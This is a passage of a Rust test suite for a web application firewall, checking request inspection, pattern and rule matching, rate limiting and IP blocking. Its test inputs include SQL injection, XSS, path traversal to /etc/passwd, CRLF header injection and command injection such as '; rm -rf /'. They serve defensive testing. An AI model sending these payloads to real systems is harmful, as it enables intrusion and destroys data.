        let missing = i.check_required_headers(&headers);
        assert_eq!(missing, vec!["x-request-id"]);
    }

    #[test]
    fn inspector_content_type_valid() {
        let mut i = RequestInspector::new();
        i.allowed_content_types = vec!["application/json".into()];
        let mut headers = HashMap::new();
        headers.insert(
            "content-type".into(),
            "application/json; charset=utf-8".into(),
        );
        assert_eq!(i.check_content_type(&headers), ContentTypeCheck::Valid);
    }

    #[test]
    fn inspector_content_type_invalid() {
        let mut i = RequestInspector::new();
        i.allowed_content_types = vec!["application/json".into()];
        let mut headers = HashMap::new();
        headers.insert("content-type".into(), "text/plain".into());
        assert!(matches!(
            i.check_content_type(&headers),
            ContentTypeCheck::Invalid(_)
        ));
    }

    #[test]
    fn inspector_content_type_missing() {
        let mut i = RequestInspector::new();
        i.allowed_content_types = vec!["application/json".into()];
        let headers = HashMap::new();
        assert_eq!(i.check_content_type(&headers), ContentTypeCheck::Missing);
    }

    #[test]
    fn inspector_no_content_type_restriction() {
        let i = RequestInspector::new();
        let headers = HashMap::new();
        assert_eq!(i.check_content_type(&headers), ContentTypeCheck::Valid);
    }

    // -----------------------------------------------------------------------
    // Pattern Matching
    // -----------------------------------------------------------------------

    #[test]
    fn pattern_contains() {
        let p = Pattern::Contains("evil".into());
        assert!(p.matches("this is evil stuff"));
        assert!(!p.matches("this is good stuff"));
    }

    #[test]
    fn pattern_case_insensitive() {
        let p = Pattern::ContainsCaseInsensitive("EVIL".into());
        assert!(p.matches("this is evil stuff"));
    }

    #[test]
    fn pattern_exact() {
        let p = Pattern::Exact("hello".into());
        assert!(p.matches("hello"));
        assert!(!p.matches("hello world"));
    }

    #[test]
    fn pattern_starts_with() {
        let p = Pattern::StartsWith("/admin".into());
        assert!(p.matches("/admin/panel"));
        assert!(!p.matches("/user/admin"));
    }

    #[test]
    fn pattern_ends_with() {
        let p = Pattern::EndsWith(".php".into());
        assert!(p.matches("index.php"));
        assert!(!p.matches("index.html"));
    }

    #[test]
    fn pattern_any_of() {
        let p = Pattern::AnyOf(vec!["bad".into(), "evil".into()]);
        assert!(p.matches("something bad"));
        assert!(p.matches("something EVIL"));
        assert!(!p.matches("something good"));
    }

    #[test]
    fn pattern_custom() {
        let p = Pattern::Custom(|s| s.len() > 10);
        assert!(p.matches("this is long enough"));
        assert!(!p.matches("short"));
    }

    // -----------------------------------------------------------------------
    // Rule Matching
    // -----------------------------------------------------------------------

    #[test]
    fn rule_matches_uri() {
        let rule = Rule {
            id: "r1".into(),
            description: "block admin".into(),
            target: RuleTarget::Uri,
            pattern: Pattern::StartsWith("/admin".into()),
            action: Action::Block,
            priority: 1,
            enabled: true,
        };
        let req = Request::new("GET", "/admin/panel");
        assert!(rule.check(&req));
    }

    #[test]
    fn rule_disabled_does_not_match() {
        let rule = Rule {
            id: "r1".into(),
            description: "block admin".into(),
            target: RuleTarget::Uri,
            pattern: Pattern::StartsWith("/admin".into()),
            action: Action::Block,
            priority: 1,
            enabled: false,
        };
        let req = Request::new("GET", "/admin/panel");
        assert!(!rule.check(&req));
    }

    #[test]
    fn rule_matches_body() {
        let rule = Rule {
            id: "r2".into(),
            description: "block bad body".into(),
            target: RuleTarget::Body,
            pattern: Pattern::Contains("malicious".into()),
            action: Action::Block,
            priority: 1,
            enabled: true,
        };
        let req = Request::new("POST", "/api").with_body("this is malicious data");
        assert!(rule.check(&req));
    }

    #[test]
    fn rule_matches_header() {
        let rule = Rule {
            id: "r3".into(),
            description: "block bad ua".into(),
            target: RuleTarget::Header("user-agent".into()),
            pattern: Pattern::ContainsCaseInsensitive("sqlmap".into()),
            action: Action::Block,
            priority: 1,
            enabled: true,
        };
        let req = Request::new("GET", "/").with_header("User-Agent", "sqlmap/1.0");
        assert!(rule.check(&req));
    }

    #[test]
    fn rule_matches_any_field() {
        let rule = Rule {
            id: "r4".into(),
            description: "block keyword".into(),
            target: RuleTarget::AnyField,
            pattern: Pattern::ContainsCaseInsensitive("forbidden".into()),
            action: Action::Block,
            priority: 1,
            enabled: true,
        };
        let req = Request::new("GET", "/ok").with_body("this is forbidden");
        assert!(rule.check(&req));
    }

    #[test]
    fn rule_matches_method() {
        let rule = Rule {
            id: "r5".into(),
            description: "block TRACE".into(),
            target: RuleTarget::Method,
            pattern: Pattern::Exact("TRACE".into()),
            action: Action::Block,
            priority: 1,
            enabled: true,
        };
        let req = Request::new("TRACE", "/");
        assert!(rule.check(&req));
    }

    // -----------------------------------------------------------------------
    // WAF Engine Integration
    // -----------------------------------------------------------------------

    #[test]
    fn waf_default_allows_clean_request() {
        let waf = Waf::new();
        let req = Request::new("GET", "/index.html");
        let v = waf.inspect(&req);
        assert_eq!(v.action, Action::Allow);
    }

    #[test]
    fn waf_blocks_sqli_in_uri() {
        let waf = Waf::new();
        let req = Request::new("GET", "/search?q=' OR '1'='1");
        let v = waf.inspect(&req);
        assert_eq!(v.action, Action::Block);
        assert_eq!(v.matched_rule.as_deref(), Some("sqli"));
    }

    #[test]
    fn waf_blocks_sqli_in_body() {
        let waf = Waf::new();
        let req = Request::new("POST", "/login").with_body("username=admin&password=' OR 1=1--");
        let v = waf.inspect(&req);
        assert_eq!(v.action, Action::Block);
    }

    #[test]
    fn waf_blocks_xss_in_body() {
        let waf = Waf::new();
        let req = Request::new("POST", "/comment").with_body("<script>alert('xss')</script>");
        let v = waf.inspect(&req);
        assert_eq!(v.action, Action::Block);
        assert_eq!(v.matched_rule.as_deref(), Some("xss"));
    }

    #[test]
    fn waf_blocks_xss_in_uri() {
        let waf = Waf::new();
        let req = Request::new("GET", "/page?name=<script>alert(1)</script>");
        let v = waf.inspect(&req);
        assert_eq!(v.action, Action::Block);
    }

    #[test]
    fn waf_blocks_command_injection() {
        let waf = Waf::new();
        let req = Request::new("POST", "/exec").with_body("input=; ls -la");
        let v = waf.inspect(&req);
        assert_eq!(v.action, Action::Block);
        assert_eq!(v.matched_rule.as_deref(), Some("cmd-injection"));
    }

    #[test]
    fn waf_blocks_path_traversal() {
        let waf = Waf::new();
        let req = Request::new("GET", "/files/../../etc/passwd");
        let v = waf.inspect(&req);
        assert_eq!(v.action, Action::Block);
        assert_eq!(v.matched_rule.as_deref(), Some("path-traversal"));
    }

    #[test]
    fn waf_blocks_header_injection() {
        let waf = Waf::new();
        let req = Request::new("GET", "/").with_header("x-custom", "value\r\nSet-Cookie: evil=1");
        let v = waf.inspect(&req);
        assert_eq!(v.action, Action::Block);
        assert_eq!(v.matched_rule.as_deref(), Some("header-injection"));
    }

    #[test]
    fn waf_blocks_ip() {
        let mut waf = Waf::new();
        let ip: IpAddr = "192.168.1.100".parse().unwrap();
        waf.ip_filter_mut().add_to_blocklist(ip);
        let req = Request::new("GET", "/").with_ip(ip);
        let v = waf.inspect(&req);
        assert_eq!(v.action, Action::Block);
        assert_eq!(v.matched_rule.as_deref(), Some("ip-filter"));
    }

    #[test]
    fn waf_rate_limit() {
        let mut waf = Waf::new();
        waf.set_rate_limiter(RateLimiter::new(2, Duration::from_secs(60)));
        let ip: IpAddr = "10.0.0.1".parse().unwrap();
        let req = Request::new("GET", "/").with_ip(ip);
        assert_eq!(waf.inspect(&req).action, Action::Allow);
        assert_eq!(waf.inspect(&req).action, Action::Allow);
        assert_eq!(waf.inspect(&req).action, Action::Block);
    }

    #[test]
    fn waf_method_not_allowed() {
        let mut waf = Waf::new();
        waf.inspector_mut().allowed_methods = vec!["GET".into(), "POST".into()];
        let req = Request::new("TRACE", "/");
        let v = waf.inspect(&req);
        assert_eq!(v.action, Action::Block);
        assert_eq!(v.matched_rule.as_deref(), Some("method-check"));
    }

    #[test]
    fn waf_body_too_large() {
        let mut waf = Waf::new();
        waf.inspector_mut().max_body_size = 10;
        let req = Request::new("POST", "/").with_body("a]".repeat(20).as_str());
        let v = waf.inspect(&req);
        assert_eq!(v.action, Action::Block);
        assert_eq!(v.matched_rule.as_deref(), Some("body-size"));
    }

    #[test]
    fn waf_missing_required_header() {
        let mut waf = Waf::new();
        waf.inspector_mut().required_headers = vec!["authorization".into()];
        let req = Request::new("GET", "/api");
        let v = waf.inspect(&req);
        assert_eq!(v.action, Action::Block);
        assert_eq!(v.matched_rule.as_deref(), Some("required-headers"));
    }

    #[test]
    fn waf_content_type_check() {
        let mut waf = Waf::new();
        waf.inspector_mut().allowed_content_types = vec!["application/json".into()];
        let req = Request::new("POST", "/api").with_header("content-type", "text/html");
        let v = waf.inspect(&req);
        assert_eq!(v.action, Action::Block);
        assert_eq!(v.matched_rule.as_deref(), Some("content-type"));
    }

    #[test]
    fn waf_custom_rule_block() {
        let mut waf = Waf::new();
        waf.add_rule(Rule {
            id: "block-admin".into(),
            description: "No admin access".into(),
            target: RuleTarget::Uri,
            pattern: Pattern::StartsWith("/admin".into()),
            action: Action::Block,
            priority: 1,
            enabled: true,
        });
        let req = Request::new("GET", "/admin/settings");
        let v = waf.inspect(&req);
        assert_eq!(v.action, Action::Block);
        assert_eq!(v.matched_rule.as_deref(), Some("block-admin"));
    }

    #[test]
    fn waf_custom_rule_log() {
        let mut waf = Waf::new();
        waf.add_rule(Rule {
            id: "log-api".into(),
            description: "Log API calls".into(),
            target: RuleTarget::Uri,
            pattern: Pattern::StartsWith("/api".into()),
            action: Action::Log,
            priority: 1,
            enabled: true,
        });
        let req = Request::new("GET", "/api/users");
        let v = waf.inspect(&req);
        assert_eq!(v.action, Action::Log);
    }

    #[test]
    fn waf_custom_rule_allow() {
        let mut waf = Waf::new();
        waf.add_rule(Rule {
            id: "allow-health".into(),
            description: "Always allow health".into(),
            target: RuleTarget::Uri,
            pattern: Pattern::Exact("/health".into()),
            action: Action::Allow,
            priority: 0,
            enabled: true,
        });
        let req = Request::new("GET", "/health");
        let v = waf.inspect(&req);
        assert_eq!(v.action, Action::Allow);
    }

    #[test]
    fn waf_rule_priority_order() {
        let mut waf = Waf::new();
        waf.add_rule(Rule {
            id: "low-priority".into(),
            description: "low".into(),
            target: RuleTarget::Uri,
            pattern: Pattern::StartsWith("/test".into()),
            action: Action::Log,
            priority: 10,
            enabled: true,
        });
        waf.add_rule(Rule {
            id: "high-priority".into(),
            description: "high".into(),
            target: RuleTarget::Uri,
            pattern: Pattern::StartsWith("/test".into()),
            action: Action::Block,
            priority: 1,
            enabled: true,
        });
        let req = Request::new("GET", "/test");
        let v = waf.inspect(&req);
        assert_eq!(v.action, Action::Block);
        assert_eq!(v.matched_rule.as_deref(), Some("high-priority"));
    }

    #[test]
    fn waf_remove_rule() {
        let mut waf = Waf::new();
        waf.add_rule(Rule {
            id: "r1".into(),
            description: "test".into(),
            target: RuleTarget::Uri,
            pattern: Pattern::Contains("x".into()),
            action: Action::Block,
            priority: 1,
            enabled: true,
        });
        assert_eq!(waf.rule_count(), 1);
        waf.remove_rule("r1");
        assert_eq!(waf.rule_count(), 0);
    }

    #[test]
    fn waf_disable_sqli_detection() {
        let mut waf = Waf::new();
        waf.sqli_detection = false;
        let req = Request::new("GET", "/search?q=' OR '1'='1");
        let v = waf.inspect(&req);
        assert_eq!(v.action, Action::Allow);
    }

    #[test]
    fn waf_disable_xss_detection() {
        let mut waf = Waf::new();
        waf.xss_detection = false;
        let req = Request::new("POST", "/").with_body("<script>alert(1)</script>");
        let v = waf.inspect(&req);
        assert_eq!(v.action, Action::Allow);
    }

    #[test]
    fn waf_disable_cmd_injection_detection() {
        let mut waf = Waf::new();
        waf.cmd_injection_detection = false;
        let req = Request::new("POST", "/").with_body("; rm -rf /");
        let v = waf.inspect(&req);
        assert_eq!(v.action, Action::Allow);
    }

    #[test]
    fn waf_disable_path_traversal_detection() {
        let mut waf = Waf::new();
        waf.path_traversal_detection = false;
        let req = Request::new("GET", "/../../etc/passwd");
        let v = waf.inspect(&req);
        assert_eq!(v.action, Action::Allow);
    }

    #[test]
    fn waf_ip_checked_before_rules() {
        let mut waf = Waf::new();
        let ip: IpAddr = "1.2.3.4".parse().unwrap();
        waf.ip_filter_mut().add_to_blocklist(ip);
        waf.add_rule(Rule {
            id: "allow-all".into(),
            description: "allow".into(),
            target: RuleTarget::AnyField,
            pattern: Pattern::Custom(|_| true),
            action: Action::Allow,
            priority: 0,
            enabled: true,
        });
        let req = Request::new("GET", "/").with_ip(ip);
        let v = waf.inspect(&req);
        assert_eq!(v.action, Action::Block);
        assert_eq!(v.matched_rule.as_deref(), Some("ip-filter"));
    }

    #[test]
    fn waf_no_ip_skips_ip_check() {
        let mut waf = Waf::new();
        let ip: IpAddr = "1.2.3.4".parse().unwrap();
        waf.ip_filter_mut().add_to_blocklist(ip);
        let req = Request::new("GET", "/"); // no IP set
        let v = waf.inspect(&req);
        assert_eq!(v.action, Action::Allow);
    }

    #[test]
    fn waf_default_is_new() {
        let waf = Waf::default();
        assert_eq!(waf.rule_count(), 0);
        assert!(waf.sqli_detection);
        assert!(waf.xss_detection);
    }

    #[test]
    fn waf_sqli_union_all_select() {
        let waf = Waf::new();
        let req = Request::new(
            "GET",
            "/data?id=1 UNION ALL SELECT username,password FROM users",
        );
        let v = waf.inspect(&req);
        assert_eq!(v.action, Action::Block);
    }

    #[test]
    fn waf_xss_in_header() {
        let waf = Waf::new();
        let req = Request::new("GET", "/").with_header("x-data", "<script>alert(1)</script>");
        let v = waf.inspect(&req);
        assert_eq!(v.action, Action::Block);
    }

    #[test]
    fn waf_multiple_attacks_first_wins() {
        let waf = Waf::new();
        // URI has both SQLi and path traversal; first check that fires wins.
        let req = Request::new("GET", "/../../etc/passwd?q=' OR 1=1--");
        let v = waf.inspect(&req);
        assert_eq!(v.action, Action::Block);
        // Either sqli or path-traversal is fine as long as it blocks.
    }

    #[test]
    fn waf_content_type_missing_when_required() {
        let mut waf = Waf::new();
        waf.inspector_mut().allowed_content_types = vec!["application/json".into()];
        let req = Request::new("POST", "/api").with_body("{}");
        let v = waf.inspect(&req);
        assert_eq!(v.action, Action::Block);
        assert_eq!(v.matched_rule.as_deref(), Some("content-type"));
    }
}
